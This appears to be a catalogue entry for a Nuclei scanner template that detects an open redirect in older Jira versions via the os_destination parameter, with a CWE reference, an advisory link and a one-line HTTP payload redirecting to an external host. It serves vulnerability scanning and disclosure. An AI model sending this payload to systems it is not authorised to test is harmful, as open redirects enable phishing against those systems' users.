# Nuclei Template: JIRA in HTTPS mode - Open Redirect
**Template ID:** jira-https-mode-open-redirect
**Vulnerability Class:** Open Redirect
**Severity:** Medium
**CWE:** CWE-601
**Source:** Nuclei Template (`jira-https-mode-open-redirect.yaml`)

## Vulnerability Information & PoC

## Description
Detected Open redirect vulnerability in Jira via os_destination parameter versions 5.2.11, 6.2, and 6.2.2.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/ThisCanBeAnything?os_destination=%2F%2Foast.pro
```

## References
- https://jira.atlassian.com/browse/JRASERVER-38075
